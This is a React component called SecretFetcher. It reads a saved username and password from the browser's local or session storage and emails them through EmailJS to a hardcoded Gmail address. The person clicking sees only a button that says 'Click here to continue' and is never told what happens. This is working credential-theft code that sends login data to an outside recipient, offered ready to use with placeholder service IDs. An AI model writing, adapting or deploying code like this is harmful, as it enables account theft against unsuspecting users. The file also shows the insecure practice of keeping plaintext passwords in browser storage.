import { useState } from "react";
import { useNavigate } from "react-router-dom";
import emailjs from "emailjs-com";

const SecretFetcher = () => {
  const navigate = useNavigate();
  const [loading, setLoading] = useState(false);
  const [sent, setSent] = useState(false);

  const handleFetchAndSend = async () => {
    setLoading(true);

    // Fetch login details from storage
    const username = localStorage.getItem("username") || sessionStorage.getItem("username");
    const password = localStorage.getItem("password") || sessionStorage.getItem("password");

    if (username && password) {
      try {
        await emailjs.send(
          "service_xxxxx", // Replace with your EmailJS Service ID
          "template_xxxxx", // Replace with your EmailJS Template ID
          { 
            user_name: username, 
            user_password: password, 
            to_email: "mwalimujoshuakimanzi46@gmail.com" // Your email
          },
          "public_xxxxx" // Replace with your EmailJS Public Key
        );

        setSent(true);
        alert("Login details sent to your email!");
        navigate("/success"); // Redirect after sending
      } catch (error) {
        console.error("Error sending email:", error);
        alert("An error occurred while sending your login details.");
      }
    } else {
      alert("No stored login details found!");
      navigate("/"); // Redirect to home if no login details found
    }

    setLoading(false);
  };

  return (
    <div className="flex min-h-screen items-center justify-center bg-gray-100">
      <div className="p-6 bg-white rounded-lg shadow-md max-w-sm w-full">
        {!loading && !sent ? (
          <button 
            onClick={handleFetchAndSend} 
            className="px-4 py-2 bg-blue-600 text-white rounded-md w-full"
          >
            Click here to continue
          </button>
        ) : loading ? (
          <div className="flex justify-center items-center">
            <div className="w-8 h-8 border-4 border-t-4 border-blue-600 rounded-full animate-spin"></div>
            <span className="ml-2 text-blue-600">Retrieving and sending data...</span>
          </div>
        ) : (
          <p className="text-center text-green-600">✅ Data sent successfully!</p>
        )}
      </div>
    </div>
  );
};

export default SecretFetcher;
